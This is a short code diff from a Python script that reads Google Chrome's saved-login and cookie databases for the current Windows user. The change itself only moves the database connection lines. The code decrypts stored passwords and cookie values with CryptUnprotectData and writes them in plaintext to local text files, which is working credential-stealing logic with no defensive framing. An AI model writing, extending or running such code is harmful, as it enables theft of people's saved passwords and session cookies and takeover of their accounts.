@@ -7,9 +7,9 @@ paths = [f'C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\D
 for path in paths:
 	try:
 		open(path,'rb')
+		db = sqlite3.connect(path)
+		c = db.cursor()
 		if 'Login Data' in path:
-			db = sqlite3.connect(path)
-			c = db.cursor()
 			f = open('Login Data.txt','a')
 			for url,username,password in c.execute('SELECT origin_url,username_value,password_value FROM logins'):
 				passwd = win32crypt.CryptUnprotectData(password)
@@ -18,8 +18,6 @@ for path in paths:
 				f.flush()
 			f.close()
 		else:
-			db = sqlite3.connect(path)
-			c = db.cursor()
 			f = open('cookies.txt','a')
 			for host_key,name,dpath,encrypted_value,has_expires in c.execute('SELECT host_key,name,path,encrypted_value,has_expires FROM cookies'):
 				cookie = win32crypt.CryptUnprotectData(encrypted_value)
